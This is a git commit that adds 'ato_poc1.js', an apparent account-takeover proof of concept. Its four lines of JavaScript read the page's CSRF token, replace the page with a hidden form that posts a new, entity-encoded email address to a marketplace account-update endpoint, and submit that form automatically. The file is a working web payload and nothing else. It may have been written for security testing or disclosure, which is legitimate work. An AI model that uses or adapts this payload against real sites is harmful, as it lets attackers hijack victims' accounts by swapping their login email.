47713b46d674fec5ef22d67ac7c69302ac48276c
mrx_w_ <96743453+abx12@users.noreply.github.com>
2024-08-25 17:13:26 +0100

    Create ato_poc1.js

---
+++ ato_poc1.js
@@ -0,0 +1,4 @@
+csrf =document.querySelector('input[name="_csrf"]')
+csrf_value=csrf.value
+document.body.innerHTML="<form action='/marketplace/account/update' method='POST'><input type='hidden' name='email' value='poc4mrxx&#32;ato4poc&#64;gmail&#46;com'/><input type='hidden' name='&#95;csrf' value='"+csrf_value+"'/><input type='submit' value='Submit request'/></form>"
+var form = document.querySelector('form').submit();
